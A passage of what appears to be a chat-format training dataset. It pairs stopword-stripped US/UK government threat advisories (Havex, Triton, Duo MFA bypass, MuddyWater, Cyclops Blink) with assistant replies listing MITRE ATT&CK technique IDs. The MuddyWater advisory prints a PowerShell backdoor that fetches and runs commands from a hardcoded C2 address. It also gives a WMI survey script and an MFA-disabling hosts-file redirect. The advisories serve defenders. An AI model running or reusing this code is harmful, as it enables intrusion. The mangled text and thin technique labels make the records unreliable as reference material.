enterprise framework version 10 attck icss framework see attck enterprise attck ics frameworks referenced threat actor tactics techniques global energy sector intrusion campaign 2011 2018 least 2011 2018 fsb also known berserk bear energetic bear teamspy dragonfly havex crouching yeti koala conducted intrusion campaign international us energy sector organizations threat actor gained remote access deployed malware designed collect icsrelated information compromised energy sector networks exfiltrated enterprise ics data beginning 2013 continuing 2014 threat actor leveraged havex malware energy sector networks threat actor gained access victim networks via spearphishing emails redirects compromised websites malicious versions legitimate software updates multiple ics vendor websites new software updates contained installations havex malware infected systems users downloaded compromised updates havex remote access trojan rat communicates command control c2 server c2 server deploys payloads enumerate collected network resources uses open platform communications opc standard gather information connected control systems devices resources within network havex allowed actor install additional malware extract data including system information lists files installed programs email address books virtual private network vpn configuration files havex payload cause common opc platforms crash could cause denialofservice condition applications rely opc communications note additional information havex see cisa ics advisory ics focused malware cisa ics alert ics focused malware update beginning 2016 threat actor began widely targeting us energy sector networks actor conducted attacks two stages first targeting thirdparty commercial organizations vendors integrators suppliers targeting energy sector organizations threat actor used compromised thirdparty infrastructure conduct spearphishing watering hole supply chain attacks harvest energy sector credentials pivot energy sector enterprise networks obtaining access us energy sector networks actor conducted network discovery moved laterally gained persistence collected exfiltrated information pertaining ics enterprise possibly operational technology ot environments exfiltrated information included vendor information reference documents ics architecture layout diagrams detailed information fsb targeting us energy sector networks see cisa alert russian government cyber activity targeting energy sector critical infrastructure sectors refer appendix ttps havex malware ttps used actor 2016 2018 targeting us energy sector networks well associated mitigations compromise middle eastbased energy sector organization triton malware 2017 2017 russian cyber actors ties tsniikhm gained access manipulated foreign oil refinerys safety devices tsniikhm actors used triton malware ics controllers resulted refinery shutting several days triton custombuilt sophisticated multistage malware affecting schneider electrics triconex tricon safety programmable logic controller plc also referred safety instrumented systemsis monitors industrial processes prevent hazardous conditions triton capable directly interacting remotely controlling compromising safety systems systems used large number environments capacity disable inhibit modify ability process fail safely could result physical consequences note additional information affected products see cisa ics advisoryschneider electric triconex tricon update b triton malware affects triconex tricon plcs modifying inmemory firmware add additional programming extra functionality allows attacker readmodify memory contents execute custom code disabling safety system triton malware multiple components including custom python script four python modules malicious shellcode contains injector payload detailed information tritons components refer cisa malware analysis report mar hatman safety system targeted malware update b note indicted tsniikhm cyber actor also involved activity targeting us energy sector companies 2018 tsniikhmassociated actors targeted usbased companys facilities attempt access companys ot systems date cisa fbi doe information indicate actors intentionally disrupted us energy sector infrastructure refer appendix ttps used triton well associated mitigations mitigations enterprise environment cisa fbi doe recommend energy sector critical infrastructure organizations implement following mitigations harden corporate enterprise network mitigations tailored combat multiple enterprise techniques observed campaigns refer appendix observed ttps additional mitigations privileged account management manage creation modification use ofand permissions associated withprivileged accounts including system root password policies set enforce secure password policies accounts disable remove features programs remove deny access unnecessary potentially vulnerable software prevent abuse adversaries audit perform audits scans systems permissions insecure software insecure configurations etc identify potential weaknesses operating system configuration make configuration changes related operating system common feature operating system result system hardening techniques multifactor authentication enforce multifactor authentication mfa requiring users provide two pieces information username password plus token eg physical smart card token generator authenticate system filter network traffic use network appliances filter ingress egress traffic perform protocolbased filtering configure software endpoints filter network traffic network segmentation architect sections network isolate critical systems functions resources use physical logical segmentation prevent access potentially sensitive systems information use demilitarized zone dmz contain internetfacing services exposed internal network limit access resources network prevent access file shares remote access systems unnecessary services mechanisms limit access may include use network concentrators remote desktop protocol rdp gateways etc execution prevention block execution code system application control andor script blocking industrial control system environment cisa fbi doe recommend energy sector critical infrastructure organizations implement following mitigations harden icsot environment network segmentation implement ensure robust network segmentation ics networks limit ability cyber threat actors move laterally ics networks network compromised implement network topology ics multiple layers critical communications occurring secure reliable layer information refer national institute standard technology special publication 80082 guide industrial control systems ics security segmentation applied portions network reliant one another functionality figure 5 page 26 cisa ics defense depth strategy document describes architecture use oneway communication diodes prevent external access whenever possible set dmzs create physical logical subnetwork acts intermediary connected security devices avoid exposure employ reliable network security protocols services feasible consider using virtual local area networks vlans additional network segmentation example placing printers separate dedicated vlans restricting users direct printer access principle applied segmentation portions process devices used example systems involved creation one component within assembly line directly related another component separate vlans allows identification unexpected communication well segmentation potential risk exposure larger scale implement perimeter security network segments limit ability cyber threat actors move laterally control traffic network segments using firewalls intrusion detection systems idss rules filtering traffic routers switches implement network monitoring key chokepointsincluding egress points internet network segments core switch locationsand key assets services eg remote access services configure ids create alarms ics traffic outside normal operations establishing baseline normal operations network traffic configure security incident event monitoring monitor analyze correlate event logs across ics network identify intrusion attempts ics best practices update software use riskbased assessment strategy determine ics networks assets zones participate patch management program test patches outofband testing environments implementation production environments implement application allow listing human machine interfaces engineering workstations harden software configuration field devices including tablets smartphones replace endoflife software hardware devices disable unused ports services ics devices testing ensure affect ics operation restrict manage remote access software enforce mfa remote access ics networks configure encryption security network protocols within ics environment allow vendors connect devices ics network use compromised device could introduce malware disallow devices live solely ics environment communicating platform transient devices provide risk exposure ics environment malicious activity environments connect maintain ics asset inventory hardware software supporting infrastructure technologies maintain robust host logging critical devices within ics environment jump boxes domain controllers repository servers etc logs aggregated centralized log server review ensure robust physical security place prevent unauthorized personal accessing controlled spaces house ics equipment regularly test manual controls critical functions kept running icsot networks need taken offline contact information organizations also report anomalous cyber activity andor cyber incidents 247 saycisacisadhsgovor calling 1844saycisa 18447292472 andor fbi via local fbi field office fbis 247 cywatch 855 2923937 cywatchfbigov references1httpswwwjusticegovopaprfourrussiangovernmentemployeeschargedtwohistoricalhackingcampaignstargetingcritical2 httpscollaboratemitreorgattackicsindexphpsoftwares00033 httpscollaboratemitreorgattackicsindexphpsoftwares00034 httpscollaboratemitreorgattackicsindexphpsoftwares0013 appendix acampaign malware tactics techniques procedures global energy sector campaign havex malware table 1 maps havexs capabilities attck enterprise framework table 2 maps havexs capabilities attck ics framework table 1 also provides associated mitigations additional mitigations refer mitigations section advisory table 1 enterprise domain tactics techniques havex2 table 2ics domain tactics techniques havex3 global energy sector campaign 2016 2018 us energy sector targeting table 3 maps 2016 2018 us energy sector targeting activity mitre attck enterprise framework mitigations techniques also provided table additional mitigations refer mitigations section advisory table 3energy sector campaign 2016 2018 targeting us energy sector observed mitre attck enterprise tactics techniques triton malware table 4 maps tritons capabilities attck ics framework mitigations harden icsot environments refer mitigations section advisory table 4ics domain tactics techniques triton4 revisions march 24 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0802, T0814, T0821, T0834, T0843, T0845, T0846, T0849, T0853, T0855, T0857, T0858, T0861, T0863, T0872, T0888, T1003.001, T1003.003, T1005, T1016, T1018, T1021.001, T1021.002, T1033, T1036, T1053.005, T1055, T1056, T1057, T1059.001, T1059.003, T1059.007, T1070.001, T1070.004, T1078, T1078.002, T1082, T1083, T1087.003, T1105, T1110.002, T1112, T1113, T1132.001, T1133, T1136.001, T1187, T1505.003, T1547.001, T1547.009, T1555.003, T1560, T1560.001, T1569.002, T1570, T1589.001, T1598"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary multifactor authentication mfa cybersecurity essential mfa one important cybersecurity practices reduce risk intrusionsaccording industry research users enable mfa 99 percent less likely account compromised every organization enforce mfa employees customers every user sign mfa available organizations implement mfa review default configurations modify necessary reduce likelihood sophisticated adversary circumvent control federal bureau investigation fbi cybersecurity infrastructure security agency cisa releasing joint cybersecurity advisory csa warn organizations russian statesponsored cyber actors gained network access exploitation default mfa protocols known vulnerability early may 2021 russian statesponsored cyber actors took advantage misconfigured account set default mfa protocols nongovernmental organization ngo allowing enroll new device mfa access victim network actors exploited critical windows print spooler vulnerability printnightmare cve202134527 run arbitrary code system privilegesrussian statesponsored cyber actors successfully exploited vulnerability targeting ngo using ciscos duo mfa enabling access cloud email accounts document exfiltration advisory provides observed tactics techniques procedures indicators compromise iocs recommendations protect russian statesponsored malicious cyber activity fbi cisa urge organizations apply recommendations mitigations section advisory including following enforce mfa review configuration policies protect fail open reenrollment scenarios ensure inactive accounts disabled uniformly across active directory mfa systems patch systems prioritize patching known exploited vulnerabilities general information russian statesponsored malicious cyber activity see cisas russia cyber threat overview advisories webpage information threat russian statesponsored malicious cyber actors us critical infrastructure well additional mitigation recommendations see joint csa understanding mitigating russian statesponsored cyber threats us critical infrastructure cisas shields technical guidance webpage click pdf version report downloadable copy iocs see aa22074astix technical details threat actor activity note advisory uses mitre attck enterprise framework version 10 see appendix table threat actors activity mapped mitre attck tactics techniques early may 2021 fbi observed russian statesponsored cyber actors gain access ngo exploit flaw default mfa protocols move laterally ngos cloud environment russian statesponsored cyber actors gained initial access victim organization via compromised credentials enrolling new device organizations duo mfa actors gained credentials via bruteforce password guessing attack allowing access victim account simple predictable password victim account unenrolled duo due long period inactivity disabled active directory duos default configuration settings allow reenrollment new device dormant accounts actors able enroll new device account complete authentication requirements obtain access victim network using compromised account russian statesponsored cyber actors performed privilege escalation via exploitation printnightmare vulnerability cve202134527 obtain administrator privileges actors also modified domain controller file cwindowssystem32driversetchosts redirecting duo mfa calls localhost instead duo server change prevented mfa service contacting server validate mfa loginthis effectively disabled mfa active domain accounts default policy duo windows fail open mfa server unreachable note fail open happen mfa implementation exclusive duo effectively disabling mfa russian statesponsored cyber actors able successfully authenticate victims virtual private network vpn nonadministrator users make remote desktop protocol rdp connections windows domain controllers actors ran commands obtain credentials additional domain accounts using method described previous paragraph changed mfa configuration file bypassed mfa newly compromised accounts actors leveraged mostly internal windows utilities already present within victim network perform activity using compromised accounts without mfa enforced russian statesponsored cyber actors able move laterally victims cloud storage email accounts access desired content indicators compromise russian statesponsored cyber actors executed following processes pingexe core windows operating system process used perform transmission control protocol tcpip ping command used test network connectivity remote host frequently used actors network discovery regeditexe standard windows executable file opens builtin registry editor rarexe data compression encryption archiving tool malicious cyber actors traditionally sought compromise mfa security protocols would provide access accounts information interest ntdsutilexe commandline tool provides management facilities active directory domain services possible tool used enumerate active directory user accounts actors modified cwindowssystem32driversetchosts file prevent communication duo mfa server 127001 apiredactedduosecuritycom following access device ip addresses used actors identified date 453213794 19196121162 17323919846 1572308139 mitigations fbi cisa recommend organizations remain cognizant threat statesponsored cyber actors exploiting default mfa protocols exfiltrating sensitive information organizations enforce mfa users without exception implementing organizations review configuration policies protect fail open reenrollment scenarios implement timeout lockout features response repeated failed login attempts ensure inactive accounts disabled uniformly across active directory mfa systems etc update software including operating systems applications firmware network assets timely manner prioritize patching known exploited vulnerabilities especially critical high vulnerabilities allow remote code execution denialofservice internetfacing equipment require accounts password logins eg service account admin accounts domain admin accounts strong unique passwords passwords reused across multiple accounts stored system adversary may access continuously monitor network logs suspicious activity unauthorized unusual login attempts implement security alerting policies changes securityenabled accountsgroups alert suspicious process creation events ntdsutil rar regedit etc note domain controller compromise suspected domainwide password resetincluding service accounts microsoft 365 m365 synchronization accounts krbtgtwill necessary remove actors access information see httpsdocsmicrosoftcomenusanswersquestions87978resetkrbtgtpasswordhtml consider soliciting support thirdparty organization provide subject matter expertise ensure actor eradicated network avoid residual issues could enable followon exploitation fbi cisa also recommend organizations implement recommendations listed reduce risk malicious cyber activity security best practices deploy local administrator password solution laps enforce server message block smb signing restrict administrative privileges local admin users groups etc review sensitive materials domain controllers sysvol share enable increased logging policies enforce powershell logging ensure antivirusendpoint detection response edr deployed endpoints enabled routinely verify unauthorized system modifications additional accounts secure shell ssh keys occurred help detect compromise detect modifications administrators use file integrity monitoring software alerts administrator blocks unauthorized changes system network best practices monitor remote access rdp logs disable unused remote accessrdp ports deny atypical inbound activity known anonymization services include commercial vpn services onion router tor implement listing policies applications remote access allow systems execute known permitted programs established security policy regularly audit administrative user accounts configure access control concept least privilege regularly audit logs ensure new accounts legitimate users scan networks open listening ports mediate unnecessary maintain historical network activity logs least 180 days case suspected compromise identify create offline backups critical assets implement network segmentation automatically update antivirus antimalware solutions conduct regular virus malware scans remote work environment best practices increase remote work environments use vpn services fbi cisa encourage organizations implement following best practices improve network security regularly update vpns network infrastructure devices devices used remote work environments latest software patches security configurations possible implement multifactor authentication vpn connections physical security tokens secure form mfa followed authenticator applications mfa unavailable require employees engaging remote work use strong passwords monitor network traffic unapproved unexpected protocols reduce potential attack surfaces discontinuing unused vpn servers may used point entry attackers user awareness best practices cyber actors frequently use unsophisticated methods gain initial access often mitigated stronger employee awareness indicators malicious activity fbi cisa recommend following best practices improve employee operations security conducting business provide enduser awareness training help prevent targeted social engineering spearphishing scams ensure employees stakeholders aware potential cyber threats delivery methods also provide users training information security principles techniques inform employees risks associated posting detailed career information social professional networking sites ensure employees aware contact see suspicious activity suspect cyberattack help quickly efficiently identify threats employ mitigation strategies information requested organizations report incidents anomalous activity fbi via local fbi field office fbis 247 cywatch 855 2923937 cywatchfbigov saycisacisadhsgov calling 1844saycisa 18447292472 appendix threat actor tactics techniques see table 1 threat actors tactics techniques identified csa see attck enterprise referenced threat actor tactics techniques table 1 threat actor mitre attck tactics techniques revisions march 15 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1190"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today protect malicious activity search indicators compromise use antivirus software patch systems prioritize patching known exploited vulnerabilities train users recognize report phishing attempts use multifactor authentication note advisory uses mitre adversarial tactics techniques common knowledge attck framework version 10 see attck enterprise referenced threat actor tactics techniques federal bureau investigation fbi cybersecurity infrastructure security agency cisa us cyber command cyber national mission force cnmf united kingdoms national cyber security centre ncscuk observed group iranian governmentsponsored advanced persistent threat apt actors known muddywater conducting cyber espionage malicious cyber operations targeting range government privatesector organizations across sectorsincluding telecommunications defense local government oil natural gasin asia africa europe north america note muddywater also known earth vetala mercury static kitten seedworm tempzagros muddywater subordinate element within iranian ministry intelligence security mois1 apt group conducted broad cyber campaigns support mois objectives since approximately 2018 muddywater actors positioned provide stolen data accesses iranian government share malicious cyber actors muddywater actors known exploit publicly reported vulnerabilities use opensource tools strategies gain access sensitive data victims systems deploy ransomware actors also maintain persistence victim networks via tactics sideloading dynamic link libraries dllsto trick legitimate programs running malwareand obfuscating powershell scripts hide command control c2 functions fbi cisa cnmf ncscuk observed muddywater actors recently using various malwarevariants powgoop small sieve canopy also known starwhale mori powerstatsalong tools part malicious activity advisory provides observed tactics techniques procedures ttps malware indicators compromise iocs associated iranian governmentsponsored apt activity aid organizations identification malicious activity sensitive networks fbi cisa cnmf ncscuk national security agency nsa recommend organizations apply mitigations advisory review following resources additional information note also see additional resources section malware analysis report mar103691271v1 muddywater iocs aa22052astix mar103691271v1stix cisas webpage iran cyber threat overview advisories ncscuk mar small sieve cnmfs press release iranian intel cyber suite malware uses open source tools click pdf version report technical details fbi cisa cnmf ncscuk observed iranian governmentsponsored muddywater apt group employing spearphishing exploiting publicly known vulnerabilities leveraging multiple opensource tools gain access sensitive government commercial networks part spearphishing campaign muddywater attempts coax targeted victim downloading zip files containing either excel file malicious macro communicates actors c2 server pdf file drops malicious file victims network muddywater actors also use techniques sideloading dlls trick legitimate programs running malware obfuscating powershell scripts hide c2 functions see powgoop section information additionally group uses multiple malware setsincluding powgoop small sieve canopystarwhale mori powerstatsfor loading malware backdoor access persistence exfiltration see descriptions malware sets including newer tools variants groups suite additionally see malware analysis report mar10369127r1v1 muddywater details powgoop muddywater actors use new variants powgoop malware main loader malicious operations consists dll loader powershellbased downloader malicious file impersonates legitimate file signed google update executable file according samples powgoop analyzed cisa cnmf powgoop consists three components dll file renamed legitimate filename goopdatedll enable dll sideloading technique dll file contained within executable googleupdateexe powershell script obfuscated dat file goopdatedat used decrypt run second obfuscated powershell script configtxt configtxt encoded obfuscated powershell script containing beacon hardcoded ip address components retrieve encrypted commands c2 server dll file hides communications muddywater c2 servers executing google update service small sieve according sample analyzed ncscuk small sieve simple python backdoor distributed using nullsoft scriptable install system nsis installer gramappexe nsis installs python backdoor indexexe adds registry run key enabling persistence muddywater disguises malicious executables uses filenames registry key names associated microsofts windows defender avoid detection casual inspection apt group also used variations microsoft eg microsift outlook filenames associated small sieve small sieve provides basic functionality required maintain expand foothold victim infrastructure avoid detection using custom string traffic obfuscation schemes together telegram bot application programming interface api specifically small sieves beacons taskings performed using telegram api hypertext transfer protocol secure https tasking beaconing data obfuscated hex byte swapping encoding scheme combined obfuscated base64 function note cybersecurity agencies united kingdom united states attribute small sieve muddywater high confidence see appendix b analysis small sieve malware canopy muddywater also uses canopystarwhale malware likely distributed via spearphishing emails targeted attachments according two canopystarwhale samples analyzed cisa canopy uses windows script file wsf scripts distributed malicious excel file note cybersecurity agencies united kingdom united states attribute malware samples muddywater high confidence samples cisa analyzed malicious excel file cooperation termsxls contained macros written visual basic applications vba two encoded windows script files victim opens excel file receive prompt enable macros occurs macros executed decoding installing two embedded windows script files first wsf installed current user startup folder persistence file contains hexadecimal hexencoded strings reshuffled file executes command run second wsf second wsf also contains hexencoded strings reshuffled file collects victim systems ip address computer name username collected data hexencoded sent adversarycontrolled ip address http88119170124 via http post request mori muddywater also uses mori backdoor uses domain name system tunneling communicate groups c2 infrastructure according one sample analyzed cisa fmldll mori uses dll written c executed regsvr32exe export dllregisterserver dll appears component another program fmldll contains approximately 200mb junk data resource directory 205 number 105 upon execution fmldll creates mutex 0x50504060 performs following tasks deletes file filenameold deletes file registry value filename dll file old extension resolves networking apis strings addencrypted key 0x05 uses base64 java script object notation json based certain key values passed json library functions appears likely json used serialize c2 commands andor results communicates using http either ipv4 ipv6 depending value unidentified flag c2 reads andor writes data following registry keys hklmsoftwarenfcipa hklmsoftwarenfcdefault powerstats group also known use powerstats backdoor runs powershell scripts maintain persistent access victim systems cnmf posted samples detailing different parts muddywaters new suite tools along javascript files used establish connections back malicious infrastructureto malware aggregation tool repository virus total network operators identify multiple instances tools network investigate may indicate presence iranian malicious cyber actor muddywater actors also known exploit unpatched vulnerabilities part targeted operations fbi cisa cnmf ncscuk observed apt group recently exploiting microsoft netlogon elevation privilege vulnerability cve20201472 microsoft exchange memory corruption vulnerability cve20200688 see cisas known exploited vulnerabilities catalog additional vulnerabilities known exploits joint cybersecurity advisory iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities additional iranian apt groupspecific vulnerability exploits survey script following script example survey script used muddywater enumerate information victim computers queries windows management instrumentation wmi service obtain information compromised machine generate string fields separated delimiter eg sample produced string usually encoded muddywater implant sent adversarycontrolled ip address getwmiobject win32operatingsystems onames ips getwmiobject win32networkadapterconfiguration filter ipenabledtrue ips ips ipaddress0s ipssubstring1s oosarchitectures systemnetdnsgethostbynamehostnames getwmiobject win32computersystemdomains envusernames antivirusproducts getwmiobject namespace rootsecuritycenter2 class antivirusproduct computername envcomputernameresanti foreachantivirusproduct antivirusproductsresanti antivirusproductdisplaynames resantiecho newly identified powershell backdoor newly identified powershell backdoor used muddywater uses singlebyte exclusiveor xor encrypt communications key 0x02 adversarycontrolled infrastructure script lightweight functionality uses invokescript method execute responses received adversary function encodetxtkeyenbyte textencodingutf8getbytestxtfori0 lt enbytecount ienbytei enbytei bxor keyencodetxt converttobase64stringenbytereturn encodetxtfunction decodetxtkeyenbyte systemconvertfrombase64stringtxtfori0 lt enbytecount ienbytei enbytei bxor keydtxt systemtextencodingutf8getstringenbytereturn dtxtglobaltt20whiletruetryw systemnethttpwebrequestcreatehttp951811614980indexphpidvictim identifierwproxy netwebrequestgetsystemwebproxyrnewobject systemiostreamreaderwgetresponsegetresponsestreamreadtoendifrlength gt 0resstringexecutioncontextinvokecommandinvokescript decode r 2wr systemnethttpwebrequestcreatehttp951811614980indexphpidvictim identifierwrproxy netwebrequestgetsystemwebproxywrheadersaddcookieencode res 2wrgetresponsegetresponsestreamcatch startsleep seconds globaltt mitre attck techniques muddywater uses attck techniques listed table 1 table 1 muddywater attck techniques2 mitigations protective controls architecture deploy application control software limit applications executable code run users email attachments files downloaded via links emails often contain executable code identity access management use multifactor authentication possible particularly webmail virtual private networks accounts access critical systems limit use administrator privileges users browse internet use email execute code administrator privileges make excellent spearphishing targets systemonce infectedenables attackers move laterally across network gain additional accesses access highly sensitive information phishing protection enable antivirus antimalware software update signature definitions timely manner wellmaintained antivirus software may prevent use commonly deployed attacker tools delivered via spearphishing suspicious unsolicited contact via email social media individual know personally click hyperlinks open attachments communications consider adding email banner emails received outside organization disabling hyperlinks received emails train users awareness simulations recognize report phishing social engineering attempts identify suspend access user accounts exhibiting unusual activity adopt threat reputation services network device operating system application email service levels reputation services used detect prevent lowreputation email addresses files urls ip addresses used spearphishing attacks vulnerability configuration management install updatespatch operating systems software firmware soon updatespatches released prioritize patching known exploited vulnerabilities additional resources information iranian governmentsponsored malicious cyber activity see cisas webpage iran cyber threat overview advisories cnmfs press release iranian intel cyber suite malware uses open source tools information resources protecting responding ransomware refer stopransomwaregov centralized wholeofgovernment webpage providing ransomware resources alerts joint advisory cybersecurity authorities australia canada new zealand united kingdom united states technical approaches uncovering remediating malicious activity provides additional guidance hunting investigating network common mistakes avoid incident handling cisa offers range nocost cyber hygiene services help critical infrastructure organizations assess identify reduce exposure threats including ransomware requesting services organizations size could find ways reduce risk mitigate attack vectors us department states rewards justice rfj program offers reward 10 million reports foreign government malicious activity us critical infrastructure see rfj website information report information securely references1 cnmf article iranian intel cyber suite malware uses open source tools2 mitre attck muddywater caveats information accessed received provided informational purposes fbi cisa cnmf nsa endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa cnmf nsa purpose document developed fbi cisa cnmf ncscuk nsa furtherance respective cybersecurity missions including responsibilities develop issue cybersecurity specifications mitigations information may shared broadly reach appropriate stakeholders united states nsa agrees attribution details provided report appendix iocs following ip addresses associated muddywater activity 5199133149 4514221317 4514221261 45153231104 46166129159 808515849 8723621222 88119170124 88119171213 89163252232 9518116149 9518116150 16413223765 1852551108 18545192228 1851177534 18511816421 18514127143 18514127248 185183967 1851839644 192210191188 192210226128 appendix b small sieve note information contained appendix ncscuk analysis small sieve sample metadata table 2 gramappexe metadata table 3 indexexe metadata functionality installation small sieve distributed large 16mb nsis installer named gramappexe appear masquerade legitimate application executed backdoor binary indexexe installed users appdataroaming directory added run key registry enabled persistence reboot installer executes backdoor platypus argument also present registry persistence key hkcusoftwaremicrosoftwindowscurrentversionrunoutlookmicrosift configuration backdoor attempts restore previously initialized session data localappdatamicrosoftwindowsoutlookdataplustxt file exist uses hardcoded values listed table 4 table 4 credentials session values tasking small sieve beacons via telegram bot api sending configured bot id currently loggedin user hosts ip address described communications beacon format section waits tasking telegram bot using pythontelegrambot module two task formats supported start argument passed causes beacon information repeated combotidcommand issuing commands passed argument following commands supported second formats described table 5 table 5 supported commands commands detailed table 5 executed directly passing cmdexe c output returned reply defense evasion antisandbox figure 1 execution guardrail threat actors may attempting thwart simple analysis passing platypus command line string obfuscation internal strings new telegram tokens stored obfuscated custom alphabet base64encoded decryption script included appendix b communications beacon format listening tasking using commandhandler objects pythontelegrambotmodule beacon generated manually using standard requests library figure 2 manually generated beacon hex host data encoded using byte shuffling algorithm described communications traffic obfuscation section report example figure 2 decodes adminwindomain1 10173218 traffic obfuscation although traffic telegram bot api protected tls small sieve obfuscates tasking response using hex byte shuffling algorithm python3 implementation shown figure 3 figure 3 traffic encoding scheme based hex conversion shuffling detection table 6 outlines indicators compromise table 6 indicators compromise string recover script figure 4 string recovery script contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfieldoffices fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov nsa client requirements general cybersecurity inquiries contact cybersecurity requirements center cybersecurityrequestsnsagov united kingdom organizations report significant cyber security incident ncscgovukreportanincident monitored 24 hours urgent assistance call 03000 200 973 revisions february 24 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1003.005, T1005, T1016, T1027, T1027.003, T1033, T1036.005, T1041, T1047, T1049, T1053.005, T1057, T1059.001, T1059.005, T1059.006, T1059.007, T1071.001, T1082, T1083, T1087.002, T1090.002, T1105, T1113, T1132.001, T1140, T1203, T1204.001, T1204.002, T1218.005, T1218.011, T1219, T1480, T1518, T1518.001, T1547.001, T1548.002, T1552.001, T1555, T1555.003, T1560.001, T1562.001, T1566.001, T1566.002, T1572, T1574.002, T1588.002, T1589.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary sandworm actor united kingdom united states previously attributed russian gru replaced exposed vpnfilter malware new advanced framework united kingdoms uk national cyber security centre ncsc cybersecurity infrastructure security agency cisa national security agency nsa federal bureau investigation fbi us identified actor known sandworm voodoo bear using new malware referred cyclops blink ncsc cisa fbi previously attributed sandworm actor russian general staff main intelligence directorates russian grus main centre special technologies gtsst malicious cyber activity previously attributed sandworm blackenergy disruption ukrainian electricity 2015 industroyer 2016 notpetya 2017 attacks winter olympics paralympics 2018 series disruptive attacks georgia 2019 cyclops blink appears replacement framework vpnfilter malware exposed 2018 exploited network devices primarily small officehome office soho routers network attached storage nas devices advisory summarizes vpnfilter malware replaces provides detail cyclops blink well associated tactics techniques procedures ttps used sandworm ncsc malware analysis report cyclops blink also available also provides mitigation measures help organizations defend malware click pdf version report technical details vpnfilter malware first exposed 2018 series articles published cisco talos 2018 describes vpnfilter modules detail vpnfilter deployed stages functionality thirdstage modules modules enabled traffic manipulation destruction infected host device likely enabled downstream devices exploited also allowed monitoring modbus scada protocols appears ongoing requirement sandworm also seen previous attacks ics networks vpnfilter targeting widespread appeared indiscriminate exceptions cisco talos reported increase victims ukraine may 2018 sandworm also deployed vpnfilter targets republic korea 2018 winter olympics may 2018 cisco talos published blog exposed vpnfilter us department justice linked activityto sandworm announced efforts disrupt botnet activity since exposure trendmicroblog january 2021 detailed residual vpnfilter infections provided data showed although reduction requests known c2 domain still third original number firststage infections sandworm since shown limited interest existing vpnfilter footholds instead preferring retool cyclops blink active since 2019 ncsc cisa fbi nsa along industry partners identified largescale modular malware framework targeting network devices new malware referred ascyclops blinkand deployed since least june 2019 fourteen months vpnfilter disrupted common vpnfilter cyclops blink deployment also appears indiscriminate widespread actor far primarily deployed cyclops blink watchguard devices likely sandworm would capable compiling malware architectures firmware note note watchguard devices reconfigured manufacturer default settings open remote management interfaces external access could infected malware overview malware sophisticated modular basic core functionality beacon device information back server enable files downloaded executed also functionality add new modules malware running allows sandworm implement additional capability required ncsc published malware analysis reporton cyclops blink provides detail malware post exploitation post exploitation cyclops blink generally deployed part firmware update achieves persistence device rebooted makes remediation harder victim devices organized clusters deployment cyclops blink list command control c2 ip addresses ports uses known c2 ip addresses date used compromised watchguard firewall devices communications cyclops blink clients servers protected transport layer security tls using individually generated keys certificates sandworm manages cyclops blink connecting c2 layer tor network mitigations cyclops blink persists reboot throughout legitimate firmware update process affected organizations therefore take steps remove malware watchguard worked closely fbi cisa nsa ncsc provided tooling guidance enable detection removal cyclops blink watchguard devices nonstandard upgrade process device owners follow step instructions ensure devices patched latest version infection removed tooling guidance watchguard found athttpsdetectionwatchguardcom addition device identified infected cyclops blink assume passwords present device compromised replace see ncsc password guidance organizations ensure management interface network devices exposed internet indicators compromise please refer accompanying cyclops blink malware analysis reportfor indicators compromise may help detect activity mitre attck advisory compiled respect mitre attck framework globally accessible knowledge base adversary tactics techniques based realworld observations cyclops blink infection mean organization primary target may selected machines could used conduct attacks organizations advised follow mitigation advice advisory defend activity refer indicators compromise exhaustive cyclops blink malware analysis report detect possible activity networks uk organizations affected activity outlined report suspected compromises ncsc athttpsreportncscgovuk guidance variety mitigations use defending malware featured advisory expose management interfaces network devices internet management interface significant attack surface exposing reduces risk see ncsc guidance httpswwwncscgovukguidanceacquiringmanaginganddisposingnetworkdevices protect devices networks keeping date use latest supported versions apply security patches promptly use antivirus scan regularly guard known malware threats see ncsc guidance httpswwwncscgovukguidancemitigatingmalware use multifactor authentication reduce impact password compromises see ncsc guidance httpswwwncscgovukguidancemultifactorauthenticationonlineservices httpswwwncscgovukguidancesettingtwofactorauthentication2fa treat people first line defense tell staff report suspected phishing emails ensure feel confident investigate reports promptly thoroughly never punish users clicking phishing links opening attachments see ncsc guidance httpswwwncscgovukphishing set security monitoring capability collecting data needed analyze network intrusions see ncsc guidance httpswwwncscgovukguidanceintroductionloggingsecuritypurposes prevent detect lateral movement organizations networks see ncsc guidance httpswwwncscgovukguidancepreventinglateralmovement document advisory result collaborative effort united kingdoms national cyber security centre ncsc united states national security agency nsa federal bureau investigation fbi department homeland security dhs cybersecurity infrastructure security agency cisa cisa fbi nsa agree attribution details provided report advisory compiled respect mitre attck framework globally accessible knowledge base adversary tactics techniques based realworld observations disclaimers report draws information derived ncsc industry sources ncsc findings recommendations made provided intention avoiding risks following recommendations remove risk ownership information risks remains relevant system owner times disclaimer endorsement information opinions contained document provided without warranties guarantees reference herein specific commercial products process service trade name trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government guidance shall used advertising product endorsement purposes nsa client requirements general cybersecurity inquiries contact cybersecurity requirements center 4108544200 cybersecurityrequestsnsagov contact information report suspicious criminal activity related information found joint cybersecurity advisory us organizationscontact local fbi field office fbigovcontactusfieldoffices fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisagov australian organizations report incidents australian signals directorates asds acsc via cybergovau call 1300 292 371 1300 cyber 1 uk organizations report significant 